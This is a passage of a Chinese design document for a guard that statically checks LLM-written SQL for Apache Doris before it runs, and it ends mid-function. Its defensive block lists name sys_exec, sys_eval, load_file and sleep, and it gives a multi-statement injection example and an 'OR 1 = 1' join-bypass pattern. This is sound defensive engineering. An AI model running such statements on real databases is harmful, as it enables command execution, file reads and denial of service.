这个模块要解决的问题只有一句话：**让大模型写 SQL，但绝不让它写出有害的 SQL**。

模型生成 SQL 这件事本身不可靠——它可能写 `DELETE`、可能写多语句、可能引用不存在的字段、可能查无权表、可能造出笛卡尔积把 Doris 打挂。这些都不能靠提示词约束（提示词是「建议」，不是「强制」）。

**做法**：在 SQL 送到 Doris 之前，用**确定性的静态分析**过一遍。分析基于 sqlglot 的 AST，不是正则、不是黑名单字符串匹配。

**输入输出**：

| 能力 | 输入 | 输出 |
| --- | --- | --- |
| SQL 校验 | 原始 SQL + `AssetAccessPolicy` | `QueryValidationResult`（是否通过 + 归一化 SQL + 引用的表/字段 + issues 列表） |
| SQL 执行 | 已校验的 SQL + `AgentSessionKey` + purpose | CSV 产物路径 + 列 Schema + 行数 + 时间范围 + 少量样例 |
| 执行记录 | 执行上下文 | `query_executions` 一条记录（成功或失败） |
| 经验沉淀 | 成功执行的 SQL | 按「角色 + SQL 结构指纹」聚合的共享经验 |
| 经验召回 | query + 角色 + 权限代次 | 相似的历史 SQL 模板 |

**一次 `execute_sql` 中间要经过哪些步骤**：

```
Explorer Agent 调 execute_sql(sql, purpose)
  │
  ├─ 1. 从 runtime.config 解析会话上下文（user_id / conversation_id / analysis_id / session_id）
  ├─ 2. 解析查询身份（身份闸）：用户 → Doris 角色 → 查询用户名 + 解密密码 + 工作组
  ├─ 3. 静态校验（校验闸）：QueryGuardService.check(sql, policy)
  │      → 解析单语句 → 只读检查 → 加载权限收窄后的目录
  │      → 解析物理表 → 星号权限检查 → sqlglot qualify 校验字段
  │      → JOIN 检查 → 输出列重名检查 → 资产权限逐项检查
  ├─ 4. 创建执行器（执行闸）：取连接池 + 设置会话级资源限制
  ├─ 5. 流式执行：边读边写 CSV 到沙箱，同时统计 Schema 与样例
  ├─ 6. 记录执行：写 query_executions；成功时聚合经验并投递索引任务
  └─ 7. 返回结果摘要给模型
```

## 7.2 代码组织规划

```
app/query/
├── errors.py                    查询经验业务错误（404 / 409）
├── providers.py                 ★ 依赖组装 + 五阶段执行环境
├── task_scheduler.py            提交索引同步任务
├── tasks.py                     索引同步任务 + 补偿任务
│
├── api/admin/
│   ├── router.py                查询经验列表/详情/禁用/删除
│   ├── dependencies.py          请求级服务注入
│   └── schemas.py               管理接口模型
│
├── models/
│   ├── execution.py             QueryExecution（query_executions 表）+ 结果摘要模型
│   ├── experience.py            QueryExperience（query_experiences 表）+ 资产关联
│   └── validation.py            QueryValidationResult / Issue / 表列引用
│
├── repositories/
│   ├── doris.py                 ★ DorisQueryRepository（流式查询 + 只读权限自检）
│   ├── execution_postgres.py    执行记录读写
│   ├── experience_postgres.py   经验读写（upsert / 失效 / 索引版本）
│   └── experience_index.py      经验 ES 索引（全文 + 向量）
│
└── services/
    ├── guard.py                 ★ 952 行，全部校验规则
    ├── executor.py              ★ 流式执行 + CSV 产物 + Schema 摘要
    ├── execution_handler.py     用例编排（身份→校验→执行→记录）
    ├── execution_recorder.py    审计落库 + 经验聚合
    ├── experience_recall.py     权限感知的经验召回（RRF）
    ├── experience_indexer.py    幂等同步单条经验
    ├── experience_invalidation.py  元数据变化触发的经验失效
    ├── experience_management.py    管理用例
    └── contracts.py             端口协议
```

**接线点**（不在本模块目录内，但属于本链路）：

| 文件 | 作用 |
| --- | --- |
| `app/assistant/agents/explorer/tools/execute_sql.py` | LangChain 工具，把 Agent 调用接到 handler |
| `app/assistant/agents/explorer/recall_runtime.py` | 注入 policy 与角色/权限代次 |
| `app/assistant/agents/runtime_factory.py` | 构造工具时执行 `build_query_execution_handler(sandbox)` |

**五阶段执行环境**是 `providers.py` 里的核心设计。它把一次查询拆成五个独立阶段，每个阶段开自己的短会话：

```python
    async def validate(
        self,
        sql: str,
        policy: AssetAccessPolicy,
    ) -> QueryValidationResult:
        """在独立元数据会话中校验 SQL。"""
        async with meta_postgres_client_manager.session() as session:
            return await QueryGuardService(
                MetaPGRepo(session),
                data_source=cfg.query.data_source,
                current_database=cfg.doris.database,
            ).check(sql, policy)
```

```python
        limits = QueryExecutionLimits(
            workload_group=principal.workload_group,
            timeout_seconds=cfg.query.timeout_seconds,
            memory_limit_bytes=cfg.query.memory_limit_bytes,
        )
        connection_provider = await query_doris_client_registry.get_or_create(
            principal.role_name,
            principal.query_user,
            principal.password,
        )
        return AnalysisQueryService(
            DorisQueryRepository(connection_provider),
            self._artifact_store,
            limits,
            self._options,
        )
```

**为什么拆阶段而不是一个长事务**：查询执行可能跑 300 秒（`timeout_seconds`）。如果身份解析、校验、执行、记录都在一个 PG 事务里，那个事务会持锁 5 分钟，元数据模块的所有写入都会被阻塞。

代价是**跨阶段没有事务一致性**：身份解析时读到的权限和校验时读到的目录可能不是同一个快照。这个代价是可接受的——权限漂移会导致查询失败（被 guard 拒绝），不会导致越权。

## 7.3 具体实现

### 7.3.1 校验规则总览

`QueryGuardService.check` 是总入口，它的结构本身就是一份「校验顺序清单」：

```python
    async def check(
        self,
        sql: str,
        policy: AssetAccessPolicy | None = None,
    ) -> QueryValidationResult:
        """返回 SQL 的完整安全检查结果。"""
        expression, issues = self._parse_single_query(sql)
        if expression is None:
            return self._result(None, issues)

        if isinstance(expression, exp.Show):
            return self._check_show_tables(expression)
        if self._references_information_schema(expression):
            return self._check_information_schema_query(expression)

        # 只读语法检查必须先于目录加载，禁止的语句不能触发额外数据库访问。
        issues.extend(self._check_readonly(expression))
        if issues:
            return self._result(None, issues)

        catalog = await self._load_catalog(policy)
        raw_tables, star_tables, table_issues = self._resolve_tables(
            expression,
            catalog,
        )
        issues.extend(table_issues)
        issues.extend(self._check_restricted_stars(catalog, raw_tables, star_tables))
        if issues:
            return self._result(None, issues, tables=raw_tables)

        try:
            qualified = self._qualify(expression, catalog)
        except OptimizeError as exc:
            issue = self._optimization_issue(expression, catalog, exc)
            return self._result(None, [issue], tables=raw_tables)

        columns = self._collect_physical_columns(qualified, catalog)
        issues.extend(self._check_joins(qualified))
        output_columns = list(qualified.named_selects)
        duplicate_outputs = self._duplicates(output_columns)
        if duplicate_outputs:
            issues.append(
                QueryValidationIssue(
                    code="duplicate_output_column",
                    message=("查询输出列名不能重复: " + ", ".join(duplicate_outputs)),
                )
            )

        if policy is not None:
            issues.extend(
                self._check_asset_policy(
                    policy,
                    raw_tables,
                    columns,
                    star_tables,
                )
            )

        normalized_sql = qualified.sql(dialect="doris", pretty=False)
        return self._result(
            normalized_sql if not issues else None,
            issues,
            tables=raw_tables,
            columns=columns,
            output_columns=output_columns,
        )
```

**分流**：`SHOW` 语句和 `information_schema` 查询走单独的窄通道（它们不是业务查询，规则完全不同），其余走主通道。

**「只读检查先于目录加载」是刻意的顺序**，注释写明了理由：**被拒绝的语句不应该触发数据库访问**。如果先加载目录再检查只读，一条 `DROP TABLE` 会先让系统去查一遍元数据表——浪费资源，而且如果元数据查询本身有副作用（比如触发 ES 查询）就更糟。

**校验规则全表**（全部基于 sqlglot AST）：

| 编号 | 规则 | 错误码 | 拦什么 |
| --- | --- | --- | --- |
| R1 | 单语句限制 | `empty_sql` / `syntax_error` / `multiple_statements` | 空 SQL、语法错、多语句 |
| R2 | 必须是查询且含 SELECT | `readonly_query_required` | 非 SELECT/WITH |
| R3 | 禁止节点黑名单 | `forbidden_operation` | AST 里出现 DDL/DML/管理语句节点 |
| R4 | 副作用函数黑名单 | `forbidden_function` | `sleep` / `load_file` / `sys_exec` 等 |
| R5 | 匿名函数白名单 | `unapproved_function` | 不在白名单的任意函数调用 |
| R6 | SHOW 只允许 SHOW TABLES | `catalog_statement_not_allowed` | 其它 SHOW、不支持的选项、非当前库 |
| R7 | information_schema 限制 | `catalog_*` | 只允许单表直接 SELECT，只允许 tables/columns |
| R8 | 必须带库过滤条件 | `catalog_scope_required` | 无 `table_schema = DATABASE()` 过滤 |
| R9 | 星号需全字段权限 | `column_access_denied` | 有隐藏字段的表上用 `*` |
| R10 | 表必须在目录中 | `catalog_not_allowed` / `unknown_database` / `unknown_table` | 外部 catalog、非当前库、不存在的表 |
| R11 | 字段存在性与类型 | `unknown_column` / `invalid_reference` / `ambiguous_column` | sqlglot qualify 失败 |
| R12 | 输出列不能重名 | `duplicate_output_column` | `SELECT a, a` |
| R13 | JOIN 条件必须跨源 | `cross_join_forbidden` / `join_condition_required` / `invalid_join_condition` | CROSS JOIN、无 ON、条件不跨源 |
| R14 | 资产权限 | `table_access_denied` / `column_access_denied` | 无权表 / 无权字段 |

### 7.3.2 单语句限制与解析

```python
    @staticmethod
    def _parse_single_query(
        sql: str,
    ) -> tuple[Expr | None, list[QueryValidationIssue]]:
        """解析且限制输入中只有一条有效语句。"""
        if not sql.strip():
            return None, [
                QueryValidationIssue(code="empty_sql", message="SQL 语句不能为空")
            ]
        try:
            parsed = sqlglot.parse(sql, read="doris")
        except ParseError as exc:
            return None, [
                QueryValidationIssue(
                    code="syntax_error",
                    message=f"SQL 语法解析失败: {exc}",
                )
            ]
        statements = [
            statement
            for statement in parsed
            if statement is not None and not isinstance(statement, exp.Semicolon)
        ]
        if len(statements) != 1:
            return None, [
                QueryValidationIssue(
                    code="multiple_statements",
                    message="仅允许执行单条 SQL 语句",
                )
            ]
        return cast(Expr, statements[0]), []
```

**用 `sqlglot.parse` 而不是正则切分**。`sqlglot.parse` 会返回语句列表，天然能识别 `;` 分隔。过滤 `exp.Semicolon` 是因为 sqlglot 会把尾部分号也解析成一个空节点。

**为什么只允许单条**：多语句是 SQL 注入的经典形态（`SELECT 1; DROP TABLE x`）。虽然 `read="doris"` 的解析已经能识别多语句，但在这里显式拒绝比依赖后续检查更稳。

### 7.3.3 只读检查（R2/R3/R4/R5）

```python
    @staticmethod
    def _check_readonly(expression: Expr) -> list[QueryValidationIssue]:
        """检查语句类型、危险节点和有副作用的函数。"""
        issues: list[QueryValidationIssue] = []
        if not isinstance(expression, exp.Query) or expression.find(exp.Select) is None:
            issues.append(
                QueryValidationIssue(
                    code="readonly_query_required",
                    message="仅允许执行 SELECT 或 WITH 只读查询语句",
                )
            )
            return issues
        forbidden_keys = sorted(
            {node.key for node in expression.walk() if node.key in _FORBIDDEN_NODE_KEYS}
        )
        if forbidden_keys:
            issues.append(
                QueryValidationIssue(
                    code="forbidden_operation",
                    message=("查询包含禁止的操作: " + ", ".join(forbidden_keys)),
                )
            )
        anonymous_functions = {
            function.name.casefold() for function in expression.find_all(exp.Anonymous)
        }
        forbidden_functions = sorted(anonymous_functions & _SIDE_EFFECT_FUNCTIONS)
        if forbidden_functions:
            issues.append(
                QueryValidationIssue(
                    code="forbidden_function",
                    message=("查询包含禁止的函数: " + ", ".join(forbidden_functions)),
                )
            )
        unapproved_functions = sorted(
            anonymous_functions - _SIDE_EFFECT_FUNCTIONS - _SAFE_ANONYMOUS_FUNCTIONS
        )
        if unapproved_functions:
            issues.append(
                QueryValidationIssue(
                    code="unapproved_function",
                    message=(
                        "查询包含未经授权的非白名单函数: "
                        + ", ".join(unapproved_functions)
                    ),
                )
            )
        return issues
```

四层检查，逐层收紧：

1. **`isinstance(expression, exp.Query)` 且 `find(exp.Select) is not None`**。要求根节点是查询且**内部含 SELECT**。为什么两个条件都要？因为 `WITH ... SELECT` 的根节点是 `exp.Query` 的某个子类，而某些语句类型（比如 `INSERT INTO ... SELECT`）也含 SELECT 但根节点不是 Query。

2. **节点黑名单**。`expression.walk()` 遍历 AST 所有节点，收集 `node.key` 落在黑名单里的。黑名单内容：

```python
_FORBIDDEN_NODE_KEYS = frozenset(
    {
        "alter",
        "analyze",
        "cache",
        "command",
        "commit",
        "copy",
        "create",
        "delete",
        "describe",
        "drop",
        "execute",
        "grant",
        "hint",
        "insert",
        "into",
        "load_data",
        "lock",
        "merge",
        "parameter",
        "placeholder",
        "pragma",
        "propertyeq",
        "replace",
        "revoke",
        "rollback",
        "set",
        "sessionparameter",
        "show",
        "transaction",
        "truncate_table",
        "uncache",
        "update",
        "use",
    }
)
```

包含几类：**写操作**（insert/update/delete/merge/replace/truncate_table）、**DDL**（create/alter/drop）、**权限管理**（grant/revoke）、**会话控制**（set/use/transaction/commit/rollback/lock）、**文件与执行**（copy/load_data/execute）、**元信息泄漏**（describe/show/analyze）。

`hint` 和 `placeholder` 也在里面——SQL 注释提示（`/*+ ... */`）可以用来做优化器提示攻击或绕过某些解析路径，直接禁掉更简单。

3. **副作用函数黑名单**：

```python
_SIDE_EFFECT_FUNCTIONS = frozenset(
    {
        "benchmark",
        "get_lock",
        "is_free_lock",
        "is_used_lock",
        "load_file",
        "master_pos_wait",
        "name_const",
        "release_all_locks",
        "release_lock",
        "sleep",
        "sys_exec",
        "sys_eval",
    }
)
```

- `sleep` / `benchmark`：DoS（用一条查询把数据库连接占死）。
- `load_file`：读服务器文件。
- `sys_exec` / `sys_eval`：执行系统命令（MySQL UDF 的经典 RCE 路径，Doris 兼容 MySQL 语法所以要防）。
- `get_lock` / `release_lock`：拿数据库锁干扰其它会话。
- `master_pos_wait`：等主从同步位置，可以拖时间。

4. **匿名函数默认拒绝**：

```python
_SAFE_ANONYMOUS_FUNCTIONS = frozenset(
    {
        "curdate",
        "current_date",
        "current_time",
        "current_timestamp",
        "now",
    }
)
```

```python
        unapproved_functions = sorted(
            anonymous_functions - _SIDE_EFFECT_FUNCTIONS - _SAFE_ANONYMOUS_FUNCTIONS
        )
```

**这是白名单而不是黑名单**。逻辑是：`exp.Anonymous` 表示 sqlglot 不认识的函数（即没有专门的 AST 节点）。Doris 的函数库很大，靠黑名单穷举不可能完整。所以反过来——只放行明确安全的五个时间函数，其余全拒。

**代价很直接**：模型写一个合法的 Doris 函数（比如某个字符串处理函数）如果 sqlglot 不识别，会被误拒。这时要手动把它加进白名单。

**注意白名单只有 5 个函数**。这说明实际业务里模型生成的 SQL 用的函数大多是 sqlglot 认识的（`SUM` / `COUNT` / `CAST` / `SUBSTRING` 等都有专门的 AST 节点，不走 `exp.Anonymous` 分支）。

### 7.3.4 目录加载与权限收窄（R9/R14 的基础）

```python
    async def _load_catalog(
        self,
        policy: AssetAccessPolicy | None,
    ) -> _Catalog:
        """读取一次一致且已按用户授权收窄的目录快照。"""
        table_infos = await self._catalog_repo.list_table_infos()
        column_infos = await self._catalog_repo.list_column_infos()
        restricted_star_tables: frozenset[str] = frozenset()
        if policy is not None:
            authorization_filter = MetadataAuthorizationFilter(
                policy,
                self._data_source,
                self._current_database,
            )
            allowed_column_keys = authorization_filter.allowed_column_keys(column_infos)
            table_infos = authorization_filter.filter_tables(
                table_infos,
                allowed_column_keys,
            )
            visible_table_names = {table.name for table in table_infos}
            restricted_star_tables = frozenset(
                table_name.casefold()
                for table_name in visible_table_names
                if any(
                    column.t_name == table_name
                    and (column.t_name, column.name) not in allowed_column_keys
                    for column in column_infos
                )
            )
            column_infos = authorization_filter.filter_columns(
                column_infos,
                allowed_column_keys,
            )
        table_names = {table.name.casefold(): table.name for table in table_infos}
        columns: dict[str, dict[str, ColumnInfo]] = {
            table_key: {} for table_key in table_names
        }
        for column in column_infos:
            table_key = column.t_name.casefold()
            if table_key in columns:
                columns[table_key][column.name.casefold()] = column
        return _Catalog(
            table_names=table_names,
            columns=columns,
            restricted_star_tables=restricted_star_tables,
        )
```

**`restricted_star_tables` 的算法值得单独讲**：

1. 先按权限过滤出可见表集合 `visible_table_names`。
2. 对每张可见表，检查**原始**（未过滤的）`column_infos` 里是否有不属于 `allowed_column_keys` 的字段。
3. 有的话，这张表进 `restricted_star_tables`。

**为什么必须用原始 `column_infos`**：过滤之后的 `column_infos` 只包含可见列，「被隐藏的列」这个信息已经丢了。如果不先用原始列表算一遍，`_check_restricted_stars` 就无从知道哪张表有隐藏字段。

目录用**全小写键**存储（`table.name.casefold()`），因为 SQL 里的表名字段名大小写不敏感。`_Catalog` 里同时保留原名（`table_names` 映射小写 → 原名），这样报错信息里显示的是元数据里声明的正式名称。

```python
@dataclass(frozen=True, slots=True)
class _Catalog:
    """一次校验使用的元数据目录快照。"""

    table_names: dict[str, str]
    columns: dict[str, dict[str, ColumnInfo]]
    restricted_star_tables: frozenset[str] = frozenset()

    @property
    def sqlglot_schema(self) -> dict[str, dict[str, str]]:
        """构造 sqlglot 单数据库字段类型映射。"""
        return {
            self.table_names[table_key]: {
                column.name: column.type for column in columns.values()
            }
            for table_key, columns in self.columns.items()
        }
```

`sqlglot_schema` 把元数据目录转成 sqlglot 的 schema 格式（`{表名: {字段名: 类型}}`），供 `qualify` 做字段存在性和类型推导。**`infer_schema=False` 意味着 sqlglot 只用我们提供的 schema，不自己猜**——这是必要的，否则它可能「猜」出字段存在，绕过我们的检查。

### 7.3.5 星号权限检查（R9）

```python
    @staticmethod
    def _check_restricted_stars(
        catalog: _Catalog,
        tables: list[QueryTableRef],
        star_tables: set[str],
    ) -> list[QueryValidationIssue]:
        """字段级授权不允许通过星号扩展隐藏字段。"""
        table_refs = {table.qualified_name.casefold(): table for table in tables}
        issues: list[QueryValidationIssue] = []
        for table_key in sorted(star_tables):
            table = table_refs.get(table_key)
            if (
                table is None
                or table.name.casefold() not in catalog.restricted_star_tables
            ):
                continue
            issues.append(
                QueryValidationIssue(
                    code="column_access_denied",
                    message=(
                        "使用通配符 '*' 需要对该表的所有字段均具备访问权限: "
                        f"{table.qualified_name}"
                    ),
                    table=table.qualified_name,
                )
            )
        return issues
```

**这个检查解决一个真实的越权路径**：用户只有 `orders.amount` 的权限，写 `SELECT * FROM orders`。如果只检查「表级权限」，`*` 展开后会带出所有字段，包括无权的。所以规则是：**在有隐藏字段的表上用 `*` 一律拒绝**，必须显式列名。

`star_tables` 的解析在 `_resolve_tables` 里，要区分 `SELECT *`（涉及作用域内所有物理表）和 `SELECT t.*`（只涉及 `t`）：

```python
            if isinstance(scope.expression, exp.Query):
                for select in scope.expression.selects:
                    for star in select.find_all(exp.Star):
                        parent = star.parent
                        if isinstance(parent, exp.Column) and parent.table:
                            table_ref = physical_sources.get(parent.table.casefold())
                            if table_ref is not None:
                                star_tables.add(table_ref.qualified_name.casefold())
                            continue
                        star_tables.update(
                            table_ref.qualified_name.casefold()
                            for table_ref in physical_sources.values()
                        )
```

用 `traverse_scope` 遍历作用域——因为子查询和 CTE 各自是一个作用域，`*` 的语义在每层不同。

### 7.3.6 字段校验用 sqlglot qualify（R11）

```python
        return cast(
            exp.Query,
            qualify(
                expression.copy(),
                dialect="doris",
                db=self._current_database,
                schema=cast(dict[str, object], schema),
                expand_alias_refs=True,
                expand_stars=True,
                infer_schema=False,
                validate_qualify_columns=True,
                quote_identifiers=False,
                identify=False,
            ),
        )
```

五个参数的作用：

| 参数 | 值 | 作用 |
| --- | --- | --- |
| `expand_alias_refs` | True | 把 `SELECT x AS y ... WHERE y > 1` 里的 `y` 展开成 `x` |
| `expand_stars` | True | 把 `*` 展开成实际字段列表（这样后面能逐个字段查权限） |
| `infer_schema` | **False** | **不猜 schema**，只用我们给的 |
| `validate_qualify_columns` | True | 校验所有列引用存在 |
| `quote_identifiers` | False | 不强制加引号（保留原始书写风格） |

**`infer_schema=False` 是关键的安全设置**。如果允许推断，sqlglot 可能「猜」出某个字段存在，从而绕过「字段必须存在于元数据目录」这条规则。

`validate_qualify_columns=True` 失败时抛 `OptimizeError`，错误信息里包含列名。这里用正则从错误文本里提取：

```python
    def _optimization_issue(
        self,
        expression: Expr,
        catalog: _Catalog,
        error: OptimizeError,
    ) -> QueryValidationIssue:
        """把 sqlglot 优化错误转换为稳定校验问题。"""
```

**注意这是一个脆弱点**：它依赖 sqlglot 报错的文本格式。sqlglot 升级改了报错措辞，这个正则就会失效（表现为错误码变成笼统的 `invalid_reference`）。代码里对这种情况有兜底（解析不出列名时返回通用错误码），所以不会崩，但错误信息会变差。

### 7.3.7 JOIN 检查（R13）

这是校验里最精巧的一段。

```python
    @classmethod
    def _check_joins(cls, expression: Expr) -> list[QueryValidationIssue]:
        """检查 JOIN 条件包含左右来源且避免隐式笛卡尔积。"""
        issues: list[QueryValidationIssue] = []
        for scope in traverse_scope(expression):
            if not isinstance(scope.expression, exp.Select):
                continue
            joins = scope.expression.args.get("joins") or []
            left_aliases: set[str] = set()
            from_expression = scope.expression.args.get("from_")
            if from_expression is not None and from_expression.this is not None:
                left_aliases.add(from_expression.this.alias_or_name.casefold())
            for join in joins:
                # 每处理一个 JOIN 就把右表加入左侧集合，后续连接必须关联已经形成的
                # 数据源集合，不能只引用自身或无关别名。
                right_alias = join.this.alias_or_name.casefold()
                kind = str(join.args.get("kind") or "").casefold()
                on = join.args.get("on")
                using = join.args.get("using") or []
                if kind == "cross":
                    issues.append(
                        QueryValidationIssue(
                            code="cross_join_forbidden",
                            message=f"不允许使用笛卡尔积 CROSS JOIN: {right_alias}",
                            table=right_alias,
                        )
                    )
                    left_aliases.add(right_alias)
                    continue
                if on is None and not using:
                    issues.append(
                        QueryValidationIssue(
                            code="join_condition_required",
                            message=f"JOIN 连接必须提供 ON 或 USING 关联条件: {right_alias}",
                            table=right_alias,
                        )
                    )
                    left_aliases.add(right_alias)
                    continue
                if on is not None and (
                    not cls._join_condition_links_sources(
                        on,
                        left_aliases,
                        right_alias,
                    )
                ):
                    issues.append(
                        QueryValidationIssue(
                            code="invalid_join_condition",
                            message=(
                                "JOIN 条件必须同时关联当前连接源与前置数据源: "
                                f"{right_alias}"
                            ),
                            table=right_alias,
                        )
                    )
                left_aliases.add(right_alias)
        return issues
```

**核心是 `left_aliases` 这个累积集合**。它从左到右处理 JOIN，每处理完一个就把右表别名加进去。所以：

```
FROM a
JOIN b ON a.id = b.a_id     ← left_aliases = {a}，要求条件同时引用 {a} 和 {b}
JOIN c ON b.id = c.b_id     ← left_aliases = {a, b}，要求条件同时引用 {a,b} 和 {c}
```

**为什么这个设计重要**：`JOIN c ON c.x = c.y`（只引用自身）在语法上完全合法，但它是**隐式笛卡尔积**——`c` 的每一行都会跟前面的结果集全部组合。如果前面的结果集有 100 万行、`c` 有 1000 行，就是 10 亿行的中间结果，足以把 Doris 打挂。所以必须要求条件**跨源**。

条件判断的递归展开：

```python
    @classmethod
    def _join_condition_links_sources(
        cls,
        condition: Expr,
        left_aliases: set[str],
        right_alias: str,
    ) -> bool:
        """确认 JOIN 条件的布尔分支包含跨来源比较。"""
        if isinstance(condition, exp.Paren):
            return cls._join_condition_links_sources(
                condition.this,
                left_aliases,
                right_alias,
            )
        if isinstance(condition, exp.Not):
            return cls._join_condition_links_sources(
                condition.this,
                left_aliases,
                right_alias,
            )
        if isinstance(condition, (exp.Or, exp.Xor)):
            return all(
                cls._join_condition_links_sources(
                    child,
                    left_aliases,
                    right_alias,
                )
                for child in (condition.this, condition.expression)
            )
        if isinstance(condition, exp.And):
            return any(
                cls._join_condition_links_sources(
                    child,
                    left_aliases,
                    right_alias,
                )
                for child in (condition.this, condition.expression)
            )
```

**`AND` 用 `any`、`OR` 用 `all`，这个区别是逻辑正确性的关键**：

- `a.id = b.a_id AND b.x > 1`：`AND` 只要有一个分支跨源，整个条件就限制了笛卡尔积（因为 `AND` 要求两个条件都满足）。用 `any` 正确。
- `a.id = b.a_id OR b.x > 1`：`OR` 的语义是「满足任一个就行」。即使第一个分支跨源，只要第二个分支对 `b` 的行恒真（比如 `b.x > 1` 对所有行成立），整体条件就退化成「不限制」，笛卡尔积照样发生。所以 `OR` 要求**所有**分支都跨源。用 `all` 正确。

**这个细节如果不注意，就会留下一个绕过路径**：写 `JOIN b ON a.id = b.a_id OR 1 = 1` 就能通过检查。

具体的跨源比较判断：

```python
    @staticmethod
    def _comparison_links_sources(
        comparison: Expr,
        left_aliases: set[str],
        right_alias: str,
    ) -> bool:
        """判断比较操作的两侧分别只引用前置来源和当前右侧来源。"""

        def source_side(operand: Expr) -> str | None:
            """判断一个比较操作数仅引用 Join 的哪一侧来源。"""
            aliases = {
                column.table.casefold()
                for column in operand.find_all(exp.Column)
                if column.table
            }
            if aliases and aliases <= left_aliases:
                return "left"
            if aliases == {right_alias}:
                return "right"
            return None

        return {
            source_side(comparison.this),
            source_side(comparison.expression),
        } == {"left", "right"}
```

比较类型的白名单：

```python
_COMPARISON_TYPES = (
    exp.EQ,
    exp.NEQ,
    exp.GT,
    exp.GTE,
    exp.LT,
    exp.LTE,
    exp.NullSafeEQ,
)
```

只认这七种比较。`LIKE` / `IN` / `BETWEEN` 不算——因为它们不能表达「两个表的列相等」这种关联关系（`a.x LIKE b.y` 语义上不是连接条件）。

### 7.3.8 资产权限逐项检查（R14）

```python
    def _check_asset_policy(
        self,
        policy: AssetAccessPolicy,
        tables: list[QueryTableRef],
        columns: list[QueryColumnRef],
        star_tables: set[str],
    ) -> list[QueryValidationIssue]:
        """逐个检查星号表和显式物理字段的资产权限。"""
        issues: list[QueryValidationIssue] = []
        columns_by_table: dict[str, list[QueryColumnRef]] = {}
        for column in columns:
            table_key = QueryTableRef(
                database=column.database,
                name=column.table,
            ).qualified_name.casefold()
            columns_by_table.setdefault(table_key, []).append(column)

        for table in tables:
            table_key = table.qualified_name.casefold()
            table_columns = columns_by_table.get(table_key, [])
            if table_key in star_tables or not table_columns:
                # 星号和未解析出显式字段的访问需要表级授权；显式列随后逐列校验。
                identity = AssetIdentity(
                    data_source=self._data_source,
                    database_name=table.database,
                    table_name=table.name,
                )
                if not policy.allows(identity):
                    issues.append(
                        QueryValidationIssue(
                            code="table_access_denied",
                            message=f"无权访问表: {table.qualified_name}",
                            table=table.qualified_name,
                        )
                    )
                if table_key in star_tables:
                    continue
            for column in table_columns:
                identity = AssetIdentity(
                    data_source=self._data_source,
                    database_name=column.database,
                    table_name=column.table,
                    column_name=column.name,
                )
                if not policy.allows(identity):
                    issues.append(
                        QueryValidationIssue(
                            code="column_access_denied",
                            message=f"无权访问字段: {column.qualified_name}",
                            table=table.qualified_name,
                            column=column.qualified_name,
                        )
                    )
        return issues
```

**两条分支的语义**：

1. **`table_key in star_tables`**：用了 `*`。要求**表级授权**（`policy.allows(表)`），然后 `continue` 跳过逐列检查——因为已经要求全表权限了，逐列检查必然通过。

   注意这里和 R9（`_check_restricted_stars`）是两道不同的闸：R9 检查的是「元数据目录里有没有隐藏字段」，R14 检查的是「授权策略里有没有表级权限」。两道都过才放行。

2. **`not table_columns`**：解析不出显式字段。这种情况（比如 `SELECT COUNT(*) FROM t`）也需要表级授权，但**不 continue**，因为后面没有列要检查。

3. **其余情况**：逐列检查。这是最常见的路径——用户有部分列权限，SQL 里显式列出了这些列。

**注意它调用的是 `policy.allows` 而不是 `is_visible`**。`allows` 要求授权**完整覆盖**目标（列级授权不能覆盖表级查询）。这就是为什么「只有 `amount` 列权限的用户」写 `SELECT * FROM orders` 会被拒。

### 7.3.9 校验结果去重

```python
    @staticmethod
    def _result(
        normalized_sql: str | None,
        issues: list[QueryValidationIssue],
        *,
        tables: list[QueryTableRef] | None = None,
        columns: list[QueryColumnRef] | None = None,
        output_columns: list[str] | None = None,
        query_kind: QueryKind = "business",
    ) -> QueryValidationResult:
        """构造稳定排序并去重的校验结果。"""
        distinct_issues = list(
            {
                (issue.code, issue.message, issue.table, issue.column): issue
                for issue in issues
            }.values()
        )
        return QueryValidationResult(
            valid=not distinct_issues,
            normalized_sql=normalized_sql,
            query_kind=query_kind,
            tables=tables or [],
            columns=columns or [],
            output_columns=output_columns or [],
            issues=distinct_issues,
        )
```

**用四元组去重**（code + message + table + column），而不是只用 code。因为同一个 code 可能对应多个不同的字段（比如三个无权字段都报 `column_access_denied`），这些都要告诉模型。

用 dict 去重同时保序（Python 3.7+ dict 保插入顺序），所以 issues 的顺序是稳定的。

`valid = not distinct_issues` 这个写法让「有效」和「有问题」严格互斥，校验模型里还有断言：

```python
    @model_validator(mode="after")
    def validate_status(self) -> "QueryValidationResult":
        """保证校验状态和问题列表一致。"""
        if self.valid == bool(self.issues):
            raise ValueError("valid 必须与 issues 是否为空保持相反状态")
        if self.valid and self.normalized_sql is None:
            raise ValueError("有效查询必须包含 normalized_sql")
        return self
```

`if self.valid == bool(self.issues)` 意思是「有效且有问题」或「无效且没问题」都报错——两种情况自相矛盾。

### 7.3.10 流式执行与 CSV 产物

```python
    async def execute(
        self,
        session_key: AgentSessionKey,
        sql: str,
        validation: QueryValidationResult,
        *,
        purpose: str,
    ) -> SuccessfulQueryExecution:
        """执行已校验查询，返回完整的成功执行信息。"""
        sql_fingerprint = hashlib.sha256(sql.encode("utf-8")).hexdigest()[:16]
        logger.info(
            "开始执行只读查询: "
            f"conversation_id={session_key.conversation_id}, "
            f"analysis_id={session_key.analysis_id}, "
            f"sql_fingerprint={sql_fingerprint}"
        )
        normalized_sql = validation.normalized_sql
        if not validation.valid or normalized_sql is None:
            raise QueryRejectedError(validation)

        scope = SandboxSessionScope(
            session_key.analysis_id,
            session_key.agent_type,
            session_key.session_id,
        )
        relative_path = (
            f"{scope.relative_workspace}/{_query_artifact_filename(purpose)}"
        )
        with tempfile.TemporaryFile(mode="w+b") as temporary_file:
            summary = await self._execute_to_csv(
                temporary_file,
                normalized_sql,
            )
            temporary_file.seek(0)
            await self._artifact_store.write_artifact(
                session_key.user_id,
                session_key.conversation_id,
                relative_path,
                temporary_file,
            )
```

**三个设计点**：

1. **二次校验**。`if not validation.valid` 再检查一次。这是防御性的——执行器可能被别的地方直接调用，不能假设调用方一定传了校验通过的结果。
2. **先写临时文件，再上传沙箱**。用 `tempfile.TemporaryFile`（内存+磁盘的混合，小文件在内存）。这样查询结果不会在内存里堆着——一个 100 万行的结果集可能有几百 MB。
3. **`sql_fingerprint` 用 sha256 前 16 位**。完整 SQL 可能很长，日志里放不下。取前 16 位十六进制（64 位）做指纹，碰撞概率极低，且能在日志里对上一次执行和一条经验记录。

**流式写入 CSV**：

```python
    async def _execute_to_csv(
        self,
        temporary_file: BinaryIO,
        sql: str,
    ) -> "_QuerySummary":
